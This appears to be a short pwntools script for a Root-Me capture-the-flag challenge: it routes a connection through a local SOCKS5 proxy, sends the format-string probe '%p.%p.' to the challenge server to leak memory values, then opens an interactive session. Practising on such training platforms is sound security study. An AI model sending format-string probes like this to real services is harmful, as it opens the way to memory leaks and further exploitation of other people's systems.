from pwn import *

context.proxy=(socks.SOCKS5,"127.0.0.1",9050)
p = remote('challenge02.root-me.org', 56032)

p.sendline('%p.%p.')

p.interactive()
